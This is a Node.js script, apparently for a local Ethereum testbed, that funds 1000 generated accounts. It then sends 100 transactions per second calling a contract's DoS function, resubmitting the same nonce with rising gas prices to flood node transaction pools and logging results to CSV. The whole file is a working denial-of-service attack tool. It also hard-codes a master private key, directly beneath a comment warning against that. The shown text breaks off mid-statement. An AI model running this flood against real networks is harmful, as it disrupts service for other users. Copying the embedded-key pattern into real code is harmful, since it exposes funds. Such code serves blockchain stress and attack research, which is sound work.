#!/usr/bin/env node

const { Web3 } = require("web3");
const fs = require("fs");

// ============================================================
// CONFIGURATION
// ============================================================

const CONTROL_RPC =
    process.env.RPC_URL ||
    "http://el-01-geth-lighthouse:8545";

const RPC_URLS = [
    "http://el-01-geth-lighthouse:8545",
    "http://el-02-geth-lighthouse:8545",
    "http://el-03-geth-lighthouse:8545",
    "http://el-04-geth-lighthouse:8545",
    "http://el-05-geth-lighthouse:8545",
    "http://el-06-geth-lighthouse:8545",
    "http://el-07-geth-lighthouse:8545",
    "http://el-08-geth-lighthouse:8545",
    "http://el-09-geth-lighthouse:8545",
    "http://el-10-geth-lighthouse:8545"
];

// ============================================================
// CONTRACT
// ============================================================

const ABI_PATH =
    process.env.ABI_PATH ||
    "/root/attack_testbed/artifacts/contracts/resource_ex_att_contract.sol/resource_ex_att_contract.json";

const CONTRACT_ADDRESS =
    process.env.CONTRACT_ADDRESS ||
    "0xb4B46bdAA835F8E4b4d8e208B6559cD267851051";

// ============================================================
// MASTER WALLET
// ============================================================

const MASTER_ADDRESS =
    process.env.MASTER_ADDRESS ||
    "0x2c57d1CFC6d5f8E4182a56b4cf75421472eBAEa4";

// Set:
// // export MASTER_PRIVATE_KEY="0x...."
// const MASTER_PRIVATE_KEY =
//     process.env.MASTER_PRIVATE_KEY || "";
// Do not hard-code the private key in the source file.
const MASTER_PRIVATE_KEY = process.env.MASTER_PRIVATE_KEY ||
		"0x7ff1a4c1d57e5e784d327c4c7651e952350bc271f156afb3d00d20f5ef924856";

// ============================================================
// EXPERIMENT
// ============================================================

const ACCOUNT_COUNT =
    Number(process.env.ACCOUNT_COUNT || 1000);

const TX_PER_SECOND =
    Number(process.env.TX_PER_SECOND || 100);

const TX_INTERVAL_MS =
    1000 / TX_PER_SECOND;

const TEST_DURATION_SECONDS =
    Number(process.env.TEST_DURATION_SECONDS || 600);

const TEST_DURATION_MS =
    TEST_DURATION_SECONDS * 1000;

const EXPECTED_SUBMISSIONS =
    Math.floor(
        TX_PER_SECOND *
        TEST_DURATION_SECONDS
    );

// ============================================================
// CONTRACT WORKLOAD
// ============================================================

const COMPLEXITY =
    Number(process.env.COMPLEXITY || 5000);

const CONTRACT_GAS_LIMIT =
    BigInt(
        process.env.CONTRACT_GAS_LIMIT ||
        "16000000"
    );

// ============================================================
// REPLACEMENT CONFIGURATION
// ============================================================

const BASE_GAS_PRICE_GWEI =
    process.env.BASE_GAS_PRICE_GWEI ||
    "1";

const REPLACEMENT_BUMP_PERCENT =
    Number(
        process.env.REPLACEMENT_BUMP_PERCENT ||
        10
    );

// ============================================================
// FUNDING CONFIGURATION
// ============================================================

const FUND_GAS_PRICE_GWEI =
    process.env.FUND_GAS_PRICE_GWEI ||
    "1";

const FUND_AMOUNT_ETH =
    process.env.FUND_AMOUNT_ETH ||
    "0.25";

// Number of accounts funded concurrently.
//
// 25 is a conservative default.
// You can try:
// FUNDING_BATCH_SIZE=50
const FUNDING_BATCH_SIZE =
    Number(
        process.env.FUNDING_BATCH_SIZE ||
        25
    );

// ============================================================
// FILES
// ============================================================

const ACCOUNTS_FILE =
    process.env.ACCOUNTS_FILE ||
    "generated_1000_accounts.json";

const RESULTS_FILE =
    process.env.RESULTS_FILE ||
    "replacement_attack_results.csv";

// ============================================================
// WEB3
// ============================================================

const controlWeb3 =
    new Web3(CONTROL_RPC);

const nodeWeb3 =
    RPC_URLS.map(
        url => new Web3(url)
    );

// ============================================================
// COUNTERS
// ============================================================

let scheduledAttempts = 0;

let rpcAccepted = 0;

let rpcErrors = 0;

let signingErrors = 0;

let nonceRecoveries = 0;

// RPC operations still running.
const outstanding =
    new Set();

// ============================================================
// HELPERS
// ============================================================

function sleep(ms) {

    return new Promise(
        resolve => setTimeout(resolve, ms)
    );
}


function nowISO() {

    return new Date().toISOString();
}


function escapeCSV(value) {

    return `"${String(value ?? "")
        .replace(/"/g, '""')}"`;
}


function getErrorMessage(error) {

    if (!error) {
        return "Unknown error";
    }

    if (
        error.cause &&
        error.cause.message
    ) {
        return error.cause.message;
    }

    if (error.message) {
        return error.message;
    }

    return String(error);
}


function isNonceTooLow(error) {

    const message =
        getErrorMessage(error)
            .toLowerCase();

    return (
        message.includes("nonce too low") ||
        message.includes("nonce is too low")
    );
}


function isReplacementUnderpriced(error) {

    const message =
        getErrorMessage(error)
            .toLowerCase();

    return message.includes(
        "replacement transaction underpriced"
    );
}

// ============================================================
// VALIDATION
// ============================================================

function validateConfiguration() {

    if (
        !/^0x[0-9a-fA-F]{64}$/.test(
            MASTER_PRIVATE_KEY
        )
    ) {

        throw new Error(
            "MASTER_PRIVATE_KEY missing or invalid.\n" +
            "Run:\n" +
            "export MASTER_PRIVATE_KEY='0x...'"
        );
    }


    if (
        !Number.isInteger(ACCOUNT_COUNT) ||
        ACCOUNT_COUNT <= 0
    ) {

        throw new Error(
            "ACCOUNT_COUNT must be > 0"
        );
    }


    if (
        !Number.isFinite(TX_PER_SECOND) ||
        TX_PER_SECOND <= 0
    ) {

        throw new Error(
            "TX_PER_SECOND must be > 0"
        );
    }


    if (
        !Number.isFinite(TEST_DURATION_SECONDS) ||
        TEST_DURATION_SECONDS <= 0
    ) {

        throw new Error(
            "TEST_DURATION_SECONDS must be > 0"
        );
    }


    if (
        !Number.isInteger(FUNDING_BATCH_SIZE) ||
        FUNDING_BATCH_SIZE <= 0
    ) {

        throw new Error(
            "FUNDING_BATCH_SIZE must be > 0"
        );
    }
}

// ============================================================
// VERIFY MASTER WALLET
// ============================================================

function verifyMasterWallet() {

    const derived =
        controlWeb3.eth.accounts
            .privateKeyToAccount(
                MASTER_PRIVATE_KEY
            );

    if (
        derived.address.toLowerCase() !==
        MASTER_ADDRESS.toLowerCase()
    ) {

        throw new Error(
            [
                "MASTER_PRIVATE_KEY does not match MASTER_ADDRESS.",
                `Configured: ${MASTER_ADDRESS}`,
                `Derived:    ${derived.address}`
            ].join("\n")
        );
    }
}

// ============================================================
// CHECK RPC NODES
// ============================================================

async function testRPCNodes() {

    console.log(
        "\n============================================================"
    );

    console.log(
        "CHECKING EL RPC NODES"
    );

    console.log(
        "============================================================"
    );


    for (
        let i = 0;
        i < nodeWeb3.length;
        i++
    ) {

        try {

            const block =
                await nodeWeb3[i]
                    .eth
                    .getBlockNumber();

            console.log(
                `[OK] EL-${String(i + 1).padStart(2, "0")} ` +
                `block=${block}`
            );

        } catch (error) {

            throw new Error(
                `Cannot connect to ${RPC_URLS[i]}: ` +
                getErrorMessage(error)
            );
        }
    }
}

// ============================================================
// GENERATE ACCOUNTS
// ============================================================

function generateAccounts(count) {

    console.log(
        "\n============================================================"
    );

    console.log(
        `GENERATING ${count} ACCOUNTS`
    );

    console.log(
        "============================================================"
    );


    const accounts = [];


    for (
        let i = 0;
        i < count;
        i++
    ) {

        const wallet =
            controlWeb3.eth.accounts.create();


        accounts.push({

            index:
                i,

            address:
                wallet.address,

            privateKey:
                wallet.privateKey,

            // Current nonce being attacked/replaced.
            nonce:
                null,

            // 0 = INITIAL
            // 1+ = REPLACEMENT
            submissionCount:
                0,

            // Counts how many times this account
            // has advanced to another nonce.
            nonceCycle:
                0,

            // Prevent two simultaneous recovery operations.
            recoveringNonce:
                false
        });
    }


    fs.writeFileSync(

        ACCOUNTS_FILE,

        JSON.stringify(

            accounts.map(
                account => ({

                    index:
                        account.index,

                    address:
                        account.address,

                    privateKey:
                        account.privateKey
                })
            ),

            null,
            2
        ),

        {
            encoding:
                "utf8",

            mode:
                0o600
        }
    );


    console.log(
        `Generated ${accounts.length} accounts.`
    );

    console.log(
        `Saved to ${ACCOUNTS_FILE}`
    );


    return accounts;
}

// ============================================================
// MASTER BALANCE
// ============================================================

async function checkMasterBalance(
    fundAmountWei,
    fundingGasPriceWei
) {

    const balance =
        BigInt(
            await controlWeb3.eth
                .getBalance(
                    MASTER_ADDRESS
                )
        );


    const totalFunding =
        fundAmountWei *
        BigInt(ACCOUNT_COUNT);


    const fundingGas =
        21000n *
        fundingGasPriceWei *
        BigInt(ACCOUNT_COUNT);


    const required =
        totalFunding +
        fundingGas;


    console.log(
        "\n============================================================"
    );

    console.log(
        "MASTER BALANCE"
    );

    console.log(
        "============================================================"
    );


    console.log(
        "Available:",
        controlWeb3.utils.fromWei(
            balance.toString(),
            "ether"
        ),
        "ETH"
    );


    console.log(
        "Estimated funding requirement:",
        controlWeb3.utils.fromWei(
            required.toString(),
            "ether"
        ),
        "ETH"
    );


    if (
        balance < required
    ) {

        throw new Error(
            "Master wallet does not have enough ETH."
        );
    }
}

// ============================================================
// FUND ONE ACCOUNT
// ============================================================

async function fundOneAccount(
    account,
    index,
    nonce,
    chainId,
    fundingGasPriceWei,
    fundAmountWei
) {

    const transaction = {

        from:
            MASTER_ADDRESS,

        to:
            account.address,

        value:
            fundAmountWei.toString(),

        gas:
            "21000",

        gasPrice:
            fundingGasPriceWei.toString(),

        nonce:
            nonce.toString(),

        chainId:
            Number(chainId)
    };


    const signed =
        await controlWeb3.eth
            .accounts
            .signTransaction(
                transaction,
                MASTER_PRIVATE_KEY
            );


    if (
        !signed.rawTransaction
    ) {

        throw new Error(
            `Unable to sign funding transaction ${index}`
        );
    }


    return new Promise(
        (resolve, reject) => {

            let hashSeen =
                false;


            controlWeb3.eth
                .sendSignedTransaction(
                    signed.rawTransaction
                )

                .once(
                    "transactionHash",

                    hash => {

                        hashSeen =
                            true;

                        console.log(
                            `[FUND ${index + 1}/${ACCOUNT_COUNT}] ` +
                            `nonce=${nonce} ` +
                            `${account.address} ` +
                            `${hash}`
                        );
                    }
                )

                .once(
                    "receipt",

                    receipt => {

                        if (
                            receipt.status === false
                        ) {

                            reject(
                                new Error(
                                    `Funding reverted for ${account.address}`
                                )
                            );

                            return;
                        }


                        resolve(
                            receipt
                        );
                    }
                )

                .once(
                    "error",

                    error => {

                        const message =
                            getErrorMessage(error);


                        console.error(
                            `[FUND ERROR] ` +
                            `account=${index + 1} ` +
                            `nonce=${nonce} ` +
                            `${message}`
                        );


                        reject(
                            error
                        );
                    }
                );
        }
    );
}

// ============================================================
// PARALLEL/BATCHED FUNDING
// ============================================================

async function fundAccounts(
    accounts,
    chainId,
    fundingGasPriceWei,
    fundAmountWei
) {

    console.log(
        "\n============================================================"
    );

    console.log(
        "FUNDING ACCOUNTS - PARALLEL BATCH MODE"
    );

    console.log(
        "============================================================"
    );


    console.log(
        `Funding batch size: ${FUNDING_BATCH_SIZE}`
    );


    // IMPORTANT:
    //
    // Read PENDING nonce.
    //
    // This avoids intentionally starting from a nonce
    // already consumed by the master account.

    const startingNonce =
        BigInt(
            await controlWeb3.eth
                .getTransactionCount(
                    MASTER_ADDRESS,
                    "pending"
                )
        );


    console.log(
        `Master starting pending nonce: ${startingNonce}`
    );


    // --------------------------------------------------------
    // Process accounts in batches.
    //
    // Example batch size 25:
    //
    // accounts 1-25 simultaneously
    // wait
    // accounts 26-50 simultaneously
    // wait
    // ...
    //
    // Each transaction still receives a UNIQUE master nonce.
    // --------------------------------------------------------

    for (
        let start = 0;
        start < accounts.length;
        start += FUNDING_BATCH_SIZE
    ) {

        const end =
            Math.min(
                start + FUNDING_BATCH_SIZE,
                accounts.length
            );


        console.log(
            `\nFunding batch ${start + 1}-${end}`
        );


        const promises =
            [];


        for (
            let i = start;
            i < end;
            i++
        ) {

            const fundingNonce =
                startingNonce +
                BigInt(i);


            promises.push(

                fundOneAccount(

                    accounts[i],

                    i,

                    fundingNonce,

                    chainId,

                    fundingGasPriceWei,

                    fundAmountWei
                )
            );
        }


        // Wait for this batch before starting next batch.
        await Promise.all(
            promises
        );


        console.log(
            `[FUNDING] ${end}/${accounts.length} completed`
        );
    }


    console.log(
        "\nAll accounts funded successfully."
    );
}

// ============================================================
// INITIALIZE ACCOUNT NONCES IN PARALLEL
// ============================================================

async function initializeNonces(
    accounts
) {

    console.log(
        "\n============================================================"
    );

    console.log(
        "READING INITIAL ACCOUNT NONCES"
    );

    console.log(
        "============================================================"
    );


    // Reading nonces can also be parallelized safely because
    // these are read-only RPC calls.

    const READ_BATCH_SIZE =
        100;


    for (
        let start = 0;
        start < accounts.length;
        start += READ_BATCH_SIZE
    ) {

        const end =
            Math.min(
                start + READ_BATCH_SIZE,
                accounts.length
            );


        const promises =
            [];


        for (
            let i = start;
            i < end;
            i++
        ) {

            promises.push(

                controlWeb3.eth
                    .getTransactionCount(
                        accounts[i].address,
                        "pending"
                    )

                    .then(
                        nonce => {

                            accounts[i].nonce =
                                BigInt(nonce);

                            accounts[i].submissionCount =
                                0;

                            accounts[i].nonceCycle =
                                0;
                        }
                    )
            );
        }


        await Promise.all(
            promises
        );


        console.log(
            `Initialized ${end}/${accounts.length}`
        );
    }


    console.log(
        "\nNonces initialized."
    );
}

// ============================================================
// REPLACEMENT GAS PRICE
// ============================================================

function calculateReplacementGasPrice(
    baseGasPriceWei,
    replacementNumber
) {

    if (
        replacementNumber === 0
    ) {

        return baseGasPriceWei;
    }


    let price =
        baseGasPriceWei;


    for (
        let i = 0;
        i < replacementNumber;
        i++
    ) {

        const numerator =
            price *
            BigInt(
                100 +
                REPLACEMENT_BUMP_PERCENT
            );


        let bumped =
            numerator /
            100n;


        if (
            bumped <= price
        ) {

            bumped =
                price + 1n;
        }


        price =
            bumped;
    }


    return price;
}

// ============================================================
// CSV
// ============================================================

function initializeCSV() {

    const header = [

        "sequence",

        "scheduled_timestamp",

        "response_timestamp",

        "elapsed_ms",

        "account_index",

        "account_address",

        "nonce",

        "nonce_cycle",

        "submission_number",

        "replacement_number",

        "transaction_type",

        "el_node",

        "rpc_url",

        "complexity",

        "gas_price_wei",

        "transaction_hash",

        "status",

        "error"

    ].join(",");


    fs.writeFileSync(
        RESULTS_FILE,
        header + "\n",
        "utf8"
    );
}


function appendResult(
    result
) {

    const row = [

        result.sequence,

        escapeCSV(
            result.scheduledTimestamp
        ),

        escapeCSV(
            result.responseTimestamp
        ),

        result.elapsedMs,

        result.accountIndex,

        escapeCSV(
            result.address
        ),

        result.nonce,

        result.nonceCycle,

        result.submissionNumber,

        result.replacementNumber,

        escapeCSV(
            result.transactionType
        ),

        escapeCSV(
            result.elNode
        ),

        escapeCSV(
            result.rpcURL
        ),

        result.complexity,

        result.gasPriceWei,

        escapeCSV(
            result.hash || ""
        ),

        escapeCSV(
            result.status
        ),

        escapeCSV(
            result.error || ""
        )

    ].join(",");


    fs.appendFileSync(
        RESULTS_FILE,
        row + "\n"
    );
}

// ============================================================
// NONCE RECOVERY
// ============================================================

async function recoverAccountNonce(
    account,
    accountIndex
) {

    // Another request may already be recovering this account.
    if (
        account.recoveringNonce
    ) {

        return false;
    }


    account.recoveringNonce =
        true;


    try {

        const oldNonce =
            account.nonce;


        // Read blockchain/txpool view of the account.
        const currentNonce =
            BigInt(
                await controlWeb3.eth
                    .getTransactionCount(
                        account.address,
                        "pending"
                    )
            );


        // ----------------------------------------------------
        // Only move forward.
        //
        // Never move nonce backwards.
        // ----------------------------------------------------

        if (
            currentNonce >
            oldNonce
        ) {

            account.nonce =
                currentNonce;


            // New nonce means NEW replacement cycle.
            //
            // First transaction for this nonce becomes INITIAL.
            account.submissionCount =
                0;


            account.nonceCycle++;


            nonceRecoveries++;


            console.log(
                "\n[NONCE RECOVERY] " +
                `account=${accountIndex + 1} ` +
                `${account.address} ` +
                `oldNonce=${oldNonce} ` +
                `newNonce=${currentNonce} ` +
                `cycle=${account.nonceCycle}\n`
            );


            return true;
        }


        console.log(
            `[NONCE RECOVERY] ` +
            `account=${accountIndex + 1} ` +
            `RPC still reports nonce=${currentNonce}; ` +
            `old=${oldNonce}`
        );


        return false;

    } catch (error) {

        console.error(
            `[NONCE RECOVERY ERROR] ` +
            `account=${accountIndex + 1} ` +
            `${getErrorMessage(error)}`
        );


        return false;

    } finally {

        account.recoveringNonce =
            false;
    }
}

// ============================================================
// SEND ONE ATTACK TRANSACTION
// ============================================================

async function submitTransaction(
    sequence,
    account,
    accountIndex,
    nodeIndex,
    chainId,
    encodedCall,
    baseGasPriceWei,
    experimentStart
) {

    const web3 =
        nodeWeb3[nodeIndex];


    const rpcURL =
        RPC_URLS[nodeIndex];


    const elNode =
        `el-${String(
            nodeIndex + 1
        ).padStart(2, "0")}-geth-lighthouse`;


    // Snapshot account state for THIS transaction.
    //
    // Important because account.nonce may later change
    // asynchronously after nonce recovery.

    const nonce =
        account.nonce;


    const nonceCycle =
        account.nonceCycle;


    const replacementNumber =
        account.submissionCount;


    const submissionNumber =
        replacementNumber + 1;


    const transactionType =
        replacementNumber === 0
            ? "INITIAL"
            : "REPLACEMENT";


    const gasPriceWei =
        calculateReplacementGasPrice(
            baseGasPriceWei,
            replacementNumber
        );


    const scheduledTimestamp =
        nowISO();


    const transaction = {

        from:
            account.address,

        to:
            CONTRACT_ADDRESS,

        value:
            "0",

        gas:
            CONTRACT_GAS_LIMIT.toString(),

        gasPrice:
            gasPriceWei.toString(),

        // SAME nonce until that nonce is mined.
        nonce:
            nonce.toString(),

        chainId:
            Number(chainId),

        // Same DoS(COMPLEXITY) workload.
        data:
            encodedCall
    };


    try {

        // ----------------------------------------------------
        // SIGN
        // ----------------------------------------------------

        const signed =
            await web3.eth
                .accounts
                .signTransaction(
                    transaction,
                    account.privateKey
                );


        if (
            !signed.rawTransaction
        ) {

            throw new Error(
                "Signing returned no raw transaction."
            );
        }


        // ----------------------------------------------------
        // Increment replacement counter.
        //
        // DO NOT increment nonce here.
        // ----------------------------------------------------

        account.submissionCount++;


        // ----------------------------------------------------
        // SEND WITHOUT WAITING FOR RECEIPT
        // ----------------------------------------------------

        const promise =
            new Promise(
                resolve => {

                    let completed =
                        false;


                    const finish =
                        () => {

                            if (
                                completed
                            ) {
                                return;
                            }


                            completed =
                                true;


                            resolve();
                        };


                    web3.eth
                        .sendSignedTransaction(
                            signed.rawTransaction
                        )

                        // ====================================
                        // ACCEPTED INTO RPC/TXPOOL
                        // ====================================

                        .once(
                            "transactionHash",

                            hash => {

                                rpcAccepted++;


                                appendResult({

                                    sequence:
                                        sequence + 1,

                                    scheduledTimestamp,

                                    responseTimestamp:
                                        nowISO(),

                                    elapsedMs:
                                        Date.now() -
                                        experimentStart,

                                    accountIndex:
                                        accountIndex + 1,

                                    address:
                                        account.address,

                                    nonce:
                                        nonce.toString(),

                                    nonceCycle,

                                    submissionNumber,

                                    replacementNumber,

                                    transactionType,

                                    elNode,

                                    rpcURL,

                                    complexity:
                                        COMPLEXITY,

                                    gasPriceWei:
                                        gasPriceWei.toString(),

                                    hash,

                                    status:
                                        "ACCEPTED",

                                    error:
                                        ""
                                });


                                console.log(
                                    `[${transactionType}] ` +
                                    `seq=${sequence + 1} ` +
                                    `account=${accountIndex + 1} ` +
                                    `nonce=${nonce} ` +
                                    `cycle=${nonceCycle} ` +
                                    `replacement=${replacementNumber} ` +
                                    `node=${elNode} ` +
                                    `gas=${gasPriceWei} ` +
                                    `hash=${hash}`
                                );


                                // We only need RPC acceptance.
                                // Do not wait for mining.
                                finish();
                            }
                        )

                        // ====================================
                        // RPC ERROR
                        // ====================================

                        .once(
                            "error",

                            error => {

                                rpcErrors++;


                                const message =
                                    getErrorMessage(
                                        error
                                    );


                                let status =
                                    "RPC_ERROR";


                                // --------------------------------
                                // NONCE TOO LOW
                                //
                                // Usually means the nonce used by
                                // this account was mined/consumed.
                                //
                                // DO NOT terminate.
                                //
                                // Recover current pending nonce.
                                // --------------------------------

                                if (
                                    isNonceTooLow(error)
                                ) {

                                    status =
                                        "NONCE_TOO_LOW";


                                    console.error(
                                        `[NONCE TOO LOW] ` +
                                        `seq=${sequence + 1} ` +
                                        `account=${accountIndex + 1} ` +
                                        `sentNonce=${nonce} ` +
                                        `node=${elNode} ` +
                                        `${message}`
                                    );


                                    // Fire recovery asynchronously.
                                    //
                                    // Scheduler continues.
                                    recoverAccountNonce(
                                        account,
                                        accountIndex
                                    ).catch(
                                        recoveryError => {

                                            console.error(
                                                "[RECOVERY ERROR]",
                                                getErrorMessage(
                                                    recoveryError
                                                )
                                            );
                                        }
                                    );

                                } else {

                                    console.error(
                                        `[RPC ERROR] ` +
                                        `seq=${sequence + 1} ` +
                                        `account=${accountIndex + 1} ` +
                                        `nonce=${nonce} ` +
                                        `replacement=${replacementNumber} ` +
                                        `node=${elNode} ` +
                                        `${message}`
                                    );
                                }


                                appendResult({

                                    sequence:
                                        sequence + 1,

                                    scheduledTimestamp,

                                    responseTimestamp:
                                        nowISO(),

                                    elapsedMs:
                                        Date.now() -
                                        experimentStart,

                                    accountIndex:
                                        accountIndex + 1,

                                    address:
                                        account.address,

                                    nonce:
                                        nonce.toString(),

                                    nonceCycle,

                                    submissionNumber,

                                    replacementNumber,

                                    transactionType,

                                    elNode,

                                    rpcURL,

                                    complexity:
                                        COMPLEXITY,

                                    gasPriceWei:
                                        gasPriceWei.toString(),

                                    hash:
                                        "",

                                    status,

                                    error:
                                        message
                                });


                                // IMPORTANT:
                                //
                                // Resolve rather than reject.
                                //
                                // RPC failure must NOT kill
                                // the experiment.
                                finish();
                            }
                        );
                }
            );


        outstanding.add(
            promise
        );


        promise.finally(
            () => {

                outstanding.delete(
                    promise
                );
            }
        );


    } catch (error) {

        // This catch is primarily for signing/setup errors.

        signingErrors++;


        const message =
            getErrorMessage(
                error
            );


        appendResult({

            sequence:
                sequence + 1,

            scheduledTimestamp,

            responseTimestamp:
                nowISO(),

            elapsedMs:
                Date.now() -
                experimentStart,

            accountIndex:
                accountIndex + 1,

            address:
                account.address,

            nonce:
                nonce.toString(),

            nonceCycle,

            submissionNumber,

            replacementNumber,

            transactionType,

            elNode,

            rpcURL,

            complexity:
                COMPLEXITY,

            gasPriceWei:
                gasPriceWei.toString(),

            hash:
                "",

            status:
                "SIGN_ERROR",

            error:
                message
        });


        console.error(
            `[SIGN ERROR] ` +
            `seq=${sequence + 1} ` +
            `account=${accountIndex + 1} ` +
            `${message}`
        );
    }
}

// ============================================================
// EXPERIMENT
// ============================================================

async function runExperiment(
    accounts,
    chainId,
    encodedCall,
    baseGasPriceWei
) {

    console.log(
        "\n============================================================"
    );

    console.log(
        "STARTING SAME-NONCE REPLACEMENT EXPERIMENT"
    );

    console.log(
        "============================================================"
    );


    console.log(
        `Accounts                 : ${ACCOUNT_COUNT}`
    );

    console.log(
        `Target submissions/sec   : ${TX_PER_SECOND}`
    );

    console.log(
        `Gap                      : ${TX_INTERVAL_MS} ms`
    );

    console.log(
        `Duration                 : ${TEST_DURATION_SECONDS} sec`
    );

    console.log(
        `Duration                 : ${(TEST_DURATION_SECONDS / 60).toFixed(2)} min`
    );

    console.log(
        `Expected submissions     : ${EXPECTED_SUBMISSIONS}`
    );

    console.log(
        `EL nodes                 : ${RPC_URLS.length}`
    );

    console.log(
        `Approx submissions/node  : ${EXPECTED_SUBMISSIONS / RPC_URLS.length}`
    );

    console.log(
        `Approx submissions/acct  : ${EXPECTED_SUBMISSIONS / ACCOUNT_COUNT}`
    );

    console.log(
        `Base gas                 : ${BASE_GAS_PRICE_GWEI} gwei`
    );

    console.log(
        `Replacement bump         : ${REPLACEMENT_BUMP_PERCENT}%`
    );

    console.log(
        `Contract workload        : DoS(${COMPLEXITY})`
    );

    console.log(
        "Nonce behavior           : replace until mined, then advance"
    );

    console.log(
        "============================================================\n"
    );


    const startTime =
        Date.now();


    const endTime =
        startTime +
        TEST_DURATION_MS;


    let sequence =
        0;


    while (
        sequence <
        EXPECTED_SUBMISSIONS
    ) {

        // ====================================================
        // ABSOLUTE SCHEDULER
        //
        // 100 tx/s:
        //
        // TX1 = 0 ms
        // TX2 = 10 ms
        // TX3 = 20 ms
        // ...
        //
        // This prevents accumulated sleep drift.
        // ====================================================

        const targetTime =
            startTime +
            (
                sequence *
                TX_INTERVAL_MS
            );


        const delay =
            targetTime -
            Date.now();


        if (
            delay > 0
        ) {

            await sleep(
                delay
            );
        }


        if (
            Date.now() >=
            endTime
        ) {

            break;
        }


        // ====================================================
        // ACCOUNT ROTATION
        //
        // TX 1    -> Account 1
        // TX 2    -> Account 2
        // ...
        // TX 1000 -> Account 1000
        //
        // TX 1001 -> Account 1 again
        // ====================================================

        const accountIndex =
            sequence %
            accounts.length;


        const account =
            accounts[
                accountIndex
            ];


        // ====================================================
        // EL NODE ROTATION
        // ====================================================

        const nodeIndex =
            sequence %
            nodeWeb3.length;


        scheduledAttempts++;


        // ====================================================
        // DO NOT AWAIT
        //
        // RPC latency must not control the scheduler.
        // ====================================================

        submitTransaction(

            sequence,

            account,

            accountIndex,

            nodeIndex,

            chainId,

            encodedCall,

            baseGasPriceWei,

            startTime

        ).catch(
            error => {

                // Final safety catch.
                //
                // Never terminate whole experiment because
                // one transaction failed.

                console.error(
                    "[UNEXPECTED SUBMISSION ERROR]",
                    getErrorMessage(error)
                );
            }
        );


        sequence++;


        // ====================================================
        // PROGRESS
        // ====================================================

        if (
            sequence % 1000 === 0
        ) {

            const elapsed =
                (
                    Date.now() -
                    startTime
                ) /
                1000;


            const schedulerRate =
                sequence /
                elapsed;


            const currentRound =
                Math.ceil(
                    sequence /
                    ACCOUNT_COUNT
                );


            console.log(
                "\n------------------------------------------------------------"
            );

            console.log(
                `Scheduled           : ${sequence}`
            );

            console.log(
                `Current round       : ${currentRound}`
            );

            console.log(
                `Elapsed             : ${elapsed.toFixed(2)} sec`
            );

            console.log(
                `Scheduler rate      : ${schedulerRate.toFixed(2)} tx/sec`
            );

            console.log(
                `RPC accepted        : ${rpcAccepted}`
            );

            console.log(
                `RPC errors          : ${rpcErrors}`
            );

            console.log(
                `Signing errors      : ${signingErrors}`
            );

            console.log(
                `Nonce recoveries    : ${nonceRecoveries}`
            );

            console.log(
                `Outstanding         : ${outstanding.size}`
            );

            console.log(
                "------------------------------------------------------------\n"
            );
        }
    }


    const sendingElapsed =
        (
            Date.now() -
            startTime
        ) /
        1000;


    console.log(
        "\n============================================================"
    );

    console.log(
        "SCHEDULING FINISHED"
    );

    console.log(
        "============================================================"
    );


    console.log(
        `Scheduled attempts      : ${sequence}`
    );

    console.log(
        `Elapsed                 : ${sendingElapsed.toFixed(3)} sec`
    );

    console.log(
        `Average scheduler rate  : ${(sequence / sendingElapsed).toFixed(2)} tx/sec`
    );

    console.log(
        `RPC accepted so far     : ${rpcAccepted}`
    );

    console.log(
        `RPC errors so far       : ${rpcErrors}`
    );

    console.log(
        `Signing errors          : ${signingErrors}`
    );

    console.log(
        `Nonce recoveries        : ${nonceRecoveries}`
    );

    console.log(
        `Outstanding RPC calls   : ${outstanding.size}`
    );


    // ========================================================
    // DRAIN OUTSTANDING RPC CALLS
    // ========================================================

    const drainDeadline =
        Date.now() +
        30000;


    while (
        outstanding.size > 0 &&
        Date.now() < drainDeadline
    ) {

        console.log(
            `Waiting for ${outstanding.size} outstanding RPC calls...`
        );


        await sleep(
            1000
        );
    }


    console.log(
        "\n============================================================"
    );

    console.log(
        "FINAL RESULTS"
    );

    console.log(
        "============================================================"
    );


    console.log(
        `Scheduled attempts : ${scheduledAttempts}`
    );

    console.log(
        `RPC accepted       : ${rpcAccepted}`
    );

    console.log(
        `RPC errors         : ${rpcErrors}`
    );

    console.log(
        `Signing errors     : ${signingErrors}`
    );

    console.log(
        `Nonce recoveries   : ${nonceRecoveries}`
    );

    console.log(
        `Still outstanding  : ${outstanding.size}`
    );

    console.log(
        `CSV                : ${RESULTS_FILE}`
    );

    console.log(
        "============================================================"
    );
}

// ============================================================
// MAIN
// ============================================================

async function main() {

    validateConfiguration();

    verifyMasterWallet();


    // ========================================================
    // RPC CHECK
    // ========================================================

    await testRPCNodes();


    // ========================================================
    // LOAD CONTRACT ABI
    // ========================================================

    const artifact =
        require(
            ABI_PATH
        );


    if (
        !artifact.abi
    ) {

        throw new Error(
            `ABI not found in ${ABI_PATH}`
        );
    }


    const contract =
        new controlWeb3.eth.Contract(
            artifact.abi,
            CONTRACT_ADDRESS
        );


    // ========================================================
    // DoS(500)
    // ========================================================

    const encodedCall =
        contract.methods
            .DoS(
                COMPLEXITY
            )
            .encodeABI();


    // ========================================================
    // CHAIN ID
    // ========================================================

    const chainId =
        await controlWeb3.eth
            .getChainId();


    // ========================================================
    // GAS VALUES
    // ========================================================

    const baseGasPriceWei =
        BigInt(
            controlWeb3.utils
                .toWei(
                    BASE_GAS_PRICE_GWEI,
                    "gwei"
                )
        );


    const fundingGasPriceWei =
        BigInt(
            controlWeb3.utils
                .toWei(
                    FUND_GAS_PRICE_GWEI,
                    "gwei"
                )
        );


    const fundAmountWei =
        BigInt(
            controlWeb3.utils
                .toWei(
                    FUND_AMOUNT_ETH,
                    "ether"
                )
        );


    // ========================================================
    // PRINT CONFIG
    // ========================================================

    console.log(
        "\n============================================================"
    );

    console.log(
        "EXPERIMENT CONFIGURATION"
    );

    console.log(
        "============================================================"
    );


    console.log(
        `Control RPC              : ${CONTROL_RPC}`
    );

    console.log(
        `Chain ID                 : ${chainId}`
    );

    console.log(
        `Master                   : ${MASTER_ADDRESS}`
    );

    console.log(
        `Contract                 : ${CONTRACT_ADDRESS}`
    );

    console.log(
        `Accounts                 : ${ACCOUNT_COUNT}`
    );

    console.log(
        `TX/sec                   : ${TX_PER_SECOND}`
    );

    console.log(
        `Gap                      : ${TX_INTERVAL_MS} ms`
    );

    console.log(
        `Duration                 : ${TEST_DURATION_SECONDS} sec`
    );

    console.log(
        `Expected submissions     : ${EXPECTED_SUBMISSIONS}`
    );

    console.log(
        `Complexity               : ${COMPLEXITY}`
    );

    console.log(
        `Gas limit                : ${CONTRACT_GAS_LIMIT}`
    );

    console.log(
        `Base gas                 : ${BASE_GAS_PRICE_GWEI} gwei`
    );

    console.log(
        `Replacement bump         : ${REPLACEMENT_BUMP_PERCENT}%`
    );

    console.log(
